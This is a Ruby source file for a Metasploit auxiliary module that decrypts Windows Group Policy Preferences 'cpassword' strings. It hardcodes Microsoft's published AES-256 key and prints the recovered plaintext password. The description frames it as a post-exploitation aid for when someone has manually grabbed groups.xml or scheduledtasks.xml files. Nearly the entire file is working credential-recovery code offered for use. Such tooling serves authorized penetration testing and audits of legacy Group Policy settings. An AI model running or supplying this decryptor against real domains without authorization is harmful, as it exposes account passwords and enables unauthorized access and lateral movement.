##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Gather Group Policy "cpassword" Decrypt Standalone',
      'Description'   => %q{
        This module will allow you to specify an encrypted cpassword string
        using the Microsofts public AES key. This is useful if you don't or
        can't use the GPP post exploitation module. Just paste the cpassword
        encrypted string and it will output the decrypted string for you.

        Tested Windows Server 2008 R2 Domain Controller.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>[
        'Ben Campbell <eat_meatballs[at]hotmail.co.uk>',
        'Loic Jaquemet <loic.jaquemet+msf[at]gmail.com>',
        'scriptmonkey <scriptmonkey[at]owobble.co.uk>',
        'theLightCosine',
        'mubix', #domain/dc enumeration code
        'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>' # made the standalone module for a straight password decrypt - useful for when you need to manually grab the groups.xml or scheduledtasks.xml manually and need to decrypt without running post exploitation module
        ],
      'References'    =>
        [
          ['URL', 'http://esec-pentest.sogeti.com/exploiting-windows-2008-group-policy-preferences'],
          ['URL', 'http://msdn.microsoft.com/en-us/library/cc232604(v=prot.13)'],
          ['URL', 'http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html'],
          ['URL', 'http://blogs.technet.com/grouppolicy/archive/2009/04/22/passwords-in-group-policy-preferences-updated.aspx']
        ],
    ))

    register_options(
      [
        OptString.new('CPASSWORD', [ true, "The encrypted cpassword string to perform decryption on."]),
      ], self.class)

  end

  def decrypt(encrypted_data)
    padding = "=" * (4 - (encrypted_data.length % 4))
    epassword = "#{encrypted_data}#{padding}"
    decoded = Rex::Text.decode_base64(epassword)
    key = "\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\x33\xb6\x6c\x1b"
    aes = OpenSSL::Cipher::Cipher.new("AES-256-CBC")
    aes.decrypt
    aes.key = key
    plaintext = aes.update(decoded)
    plaintext << aes.final
    pass = plaintext.unpack('v*').pack('C*') # UNICODE conversion
    print_good("The decrypted AES password is: #{pass}")

  end

  def run
      encrypted_data = datastore['CPASSWORD']
      pass = decrypt(encrypted_data)

  end
end
